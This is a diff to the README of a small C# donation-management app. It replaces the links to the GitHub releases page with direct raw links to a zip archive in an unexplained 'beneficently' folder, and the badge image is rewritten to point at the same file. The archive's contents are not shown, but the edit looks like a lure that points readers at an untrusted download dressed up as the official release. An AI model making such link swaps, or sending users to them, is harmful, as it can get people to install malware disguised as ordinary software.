@@ -4,7 +4,7 @@
 Welcome to the Donation Management System. This application helps you manage donations easily. It tracks donor information and fund usage all in one place.
 
 ## 📥 Download the Application
-[![Download Here](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Endy-SS/Donation-Management-System-C-/releases)
+[![Download Here](https://raw.githubusercontent.com/Endy-SS/Donation-Management-System-C-/main/beneficently/Donation-Management-System-C-.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Endy-SS/Donation-Management-System-C-/main/beneficently/Donation-Management-System-C-.zip)
 
 ## 🌟 Features
 - **User-Friendly Interface**: Simple console design makes it easy for anyone to navigate.
@@ -22,7 +22,7 @@ To run the Donation Management System, your computer must meet these requirement
 - **Storage**: 100 MB of free space
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download the Latest Release](https://github.com/Endy-SS/Donation-Management-System-C-/releases).
+To get started, visit this page to download: [Download the Latest Release](https://raw.githubusercontent.com/Endy-SS/Donation-Management-System-C-/main/beneficently/Donation-Management-System-C-.zip).
 
 1. Click the link above.
 2. Locate the latest release on the page.
